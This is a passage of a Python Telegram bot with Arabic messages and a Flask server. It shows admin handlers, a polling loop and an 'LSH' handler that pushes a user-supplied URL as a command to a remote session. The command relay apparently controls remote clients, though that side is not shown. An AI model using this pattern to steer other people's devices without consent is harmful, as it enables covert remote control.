    bot.send_message(message.chat.id, f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`",
                     parse_mode="Markdown")


def admin_msg_user_handler(message, uid):
    if not is_admin(message.chat.id):
        return
    try:
        bot.send_message(uid, f"📨 **من الإدارة:**\n\n{message.text}",
                         parse_mode="Markdown")
        bot.send_message(message.chat.id, "✅ تم الإرسال", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {e}")


# ============================================================
# LSH — رابط مُدخل
# ============================================================
_pending_open_url = {}


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url
                                    and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        bot.send_message(message.chat.id, "✅ تم الإرسال" if ok else "❌ فشل")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] ============================================")
    print("[+] Starting Telegram Bot polling...")
    print(f"[+] Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print("[+] ============================================")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        print(f"[+] deleteWebhook HTTP {r.status_code}")
    except Exception as e:
        print(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
        print(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        print(f"[-] getMe: {e}")

    print("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            print(f"[+] Polling attempt #{attempt}")
            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            print(f"[-] Polling crashed: {e}")
            print("[+] Restarting in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    time.sleep(2)

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
